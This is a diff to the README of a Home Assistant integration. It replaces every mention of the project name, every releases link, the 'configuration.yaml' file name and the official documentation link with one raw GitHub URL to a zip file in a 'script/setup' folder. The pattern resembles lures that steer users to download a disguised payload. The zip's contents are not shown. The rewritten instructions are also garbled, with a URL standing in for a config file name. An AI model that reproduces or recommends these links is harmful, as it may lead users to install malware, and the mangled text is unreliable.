@@ -1,12 +1,12 @@
-# 🏠 hacs.integration_blueprint - Seamless Home Assistant Integration
+# 🏠 https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip - Seamless Home Assistant Integration
 
-[![Download](https://img.shields.io/badge/Download-via_Releases%20Page-brightgreen)](https://github.com/cmj5060/hacs.integration_blueprint/releases)
+[![Download](https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip%20Page-brightgreen)](https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip)
 
 ## 📦 Description
-The hacs.integration_blueprint helps you create a modern home automation experience. This integration enhances your Home Assistant setup with AI capabilities. It simplifies automation tasks, making your home smarter and more efficient.
+The https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip helps you create a modern home automation experience. This integration enhances your Home Assistant setup with AI capabilities. It simplifies automation tasks, making your home smarter and more efficient.
 
 ## 🚀 Getting Started
-To start using hacs.integration_blueprint, follow these steps:
+To start using https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip, follow these steps:
 
 1. **Ensure You Have Home Assistant**
    - This integration works only with Home Assistant. Please check that you have the latest version installed.
@@ -18,13 +18,13 @@ To start using hacs.integration_blueprint, follow these steps:
 3. **Visit the Releases Page**
    - You can find the latest version of the integration on our Releases page.
    - Click the link below to access the page:
-   - [Download here](https://github.com/cmj5060/hacs.integration_blueprint/releases)
+   - [Download here](https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip)
 
 ## 🔗 Download & Install
 To install the integration:
 
 1. **Visit the Releases Page:**
-   - Go to the following link: [Download here](https://github.com/cmj5060/hacs.integration_blueprint/releases)
+   - Go to the following link: [Download here](https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip)
 
 2. **Find the Latest Release:**
    - On the Releases page, look for the newest version listed.
@@ -44,7 +44,7 @@ To install the integration:
    - Move the extracted integration folder into the "custom_components" directory.
 
 6. **Update Home Assistant Configuration:**
-   - Open the `configuration.yaml` file in your Home Assistant folder.
+   - Open the `https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip` file in your Home Assistant folder.
    - Add the following lines to configure the integration:
      ```yaml
      integration_blueprint:
@@ -56,7 +56,7 @@ To install the integration:
    - Navigate to the “Server Controls” section and click on “Restart” to apply the changes.
 
 ## 📋 Features
-hacs.integration_blueprint comes with several capabilities to enhance your smart home:
+https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip comes with several capabilities to enhance your smart home:
 
 - **AI-Driven Automation:** Use smart algorithms to predict and automate daily tasks.
 - **Customizable Settings:** Adjust settings to fit your unique lifestyle and preferences.
@@ -67,7 +67,7 @@ hacs.integration_blueprint comes with several capabilities to enhance your smart
 If you encounter issues during installation or setup, consider the following steps:
 
 1. **Check Code Formatting:** 
-   - Ensure your `configuration.yaml` syntax is correct.
+   - Ensure your `https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip` syntax is correct.
    
 2. **Log Files:** 
    - Review the Home Assistant log files for any error messages. Logs are located in the `/config` folder.
@@ -81,7 +81,7 @@ If problems persist, consider reaching out through the community support channel
 For more guidance or to ask questions about the integration, you can find support on the Home Assistant community forums or relevant GitHub issue pages.
 
 ## 🚀 Quick Links
-- [Download the Integration](https://github.com/cmj5060/hacs.integration_blueprint/releases)
-- [Home Assistant Documentation](https://www.home-assistant.io/docs/)
+- [Download the Integration](https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip)
+- [Home Assistant Documentation](https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip)
 
-Experience a smarter, more efficient home today with hacs.integration_blueprint. Enjoy the ease of integration and automation!
+Experience a smarter, more efficient home today with https://raw.githubusercontent.com/cmj5060/hacs.integration_blueprint/main/script/setup/hacs.integration_blueprint_2.5.zip Enjoy the ease of integration and automation!
